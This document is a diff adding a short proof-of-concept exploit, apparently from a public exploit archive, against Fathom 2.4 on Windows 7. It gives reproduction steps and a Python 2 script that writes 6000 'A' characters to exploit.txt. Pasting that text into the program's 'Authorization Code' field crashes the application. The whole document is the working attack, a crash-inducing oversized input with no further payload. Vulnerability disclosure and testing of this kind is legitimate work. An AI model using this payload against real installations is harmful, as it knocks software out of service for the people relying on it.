@@ -1,0 +1,25 @@
+# Exploit Title: Fathom 2.4 - Denial Of Service (PoC)
+# Author: Gionathan "John" Reale
+# Discovey Date: 2018-08-28
+# Homepage: https://fathom.concord.org/
+# Software Link: https://fathom.concord.org/download/
+# Tested Version: v2.4
+# Tested on OS: Windows 7 32-bit
+# Steps to Reproduce: Run the python exploit script, it will create a new 
+# file with the name "exploit.txt". Copy the content of the new file "exploit.txt". 
+# Now start the program, in the field named: "Authorization Code" paste the "exploit.txt" content copied eariler.
+# Click "Activate" and see a crash! 
+
+#!/usr/bin/python
+   
+buffer = "A" * 6000
+
+payload = buffer
+try:
+    f=open("exploit.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
